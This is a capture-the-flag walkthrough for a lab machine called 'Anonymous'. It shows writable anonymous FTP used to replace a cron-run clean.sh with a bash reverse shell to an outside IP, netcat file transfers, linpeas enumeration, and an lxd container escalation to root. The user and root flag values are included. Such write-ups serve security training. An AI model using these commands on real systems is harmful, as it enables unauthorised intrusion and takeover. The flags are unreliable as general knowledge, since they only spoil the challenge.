# Anonymous

--------------------------------------------------------------------

## GIVEN INFO

**IP Address**: 10.10.49.188

--------------------------------------------------------------------

## PROCEDURE

```
nmap -sV -sC 10.10.49.188
```

**EXPOSED PORT (SERVICE)**:<br>
    21 (ftp vsftpd 2.0.8),<br>
    22 (ssh OpenSSH 7.6p1),<br>
    139 (netbios-ssn Samba smbd),<br>
    445 (netbios-ssn Samba smbd)

Anonymous ftp login allowed

```
ftp anonymous@10.10.49.188 
```

Looks like clean.sh is being run periodically<br>
We have write permission so we can inject our own code

Replace clean.sh with this code for reverse shell
```
bash -i >& /dev/tcp/10.6.1.136/4444 0>&1
```

Upload updated version to ftp
```
ftp anonymous@10.10.49.188
cd scripts
put clean.sh
```

Start listener
```
nc -lnvp 4444
```

user.txt: 90d6f992585815ff991e68748c414740

```
sudo -l
```

Nothing found

Try using linpeas
```
curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh  > linpeas
nc -lnvp 5555 > linpeas
nc -v 10.10.49.188 5555 < linpeas
chmod +x linpeas
./linpeas
```

Found lxd user group with elevated privileges

Found privilege escalation method from https://book.hacktricks.xyz/linux-hardening/privilege-escalation/interesting-groups-linux-pe/lxd-privilege-escalation
```
sudo su

#Install requirements
sudo apt update
sudo apt install -y git golang-go debootstrap rsync gpg squashfs-tools

#Clone repo
git clone https://github.com/lxc/distrobuilder

#Make distrobuilder
cd distrobuilder
make

#Prepare the creation of alpine
mkdir -p $HOME/ContainerImages/alpine/
cd $HOME/ContainerImages/alpine/
wget https://raw.githubusercontent.com/lxc/lxc-ci/master/images/alpine.yaml

#Create the container
sudo $HOME/go/bin/distrobuilder build-lxd alpine.yaml -o image.release=3.8

#Then, upload to the vulnerable server the files lxd.tar.xz and rootfs.squashfs
nc -lnvp 5555 > lxd.tar.xz
nc -v 10.10.49.188 5555 < lxd.tar.xz
nc -lnvp 5555 > rootfs.squashfs
nc -v 10.10.49.188 5555 < rootfs.squashfs
lxc image import lxd.tar.xz rootfs.squashfs --alias alpine
lxc image list #You can see your new imported image

#Create a container and add root path
lxc init alpine privesc -c security.privileged=true
lxc list #List containers
lxc config device add privesc host-root disk source=/ path=/mnt/root recursive=true

#Execute the container
lxc start privesc
lxc exec privesc /bin/sh

# Find root flag
find / -iname root.txt
```

root.txt: 4d930091c31a622a7ed10f27999af363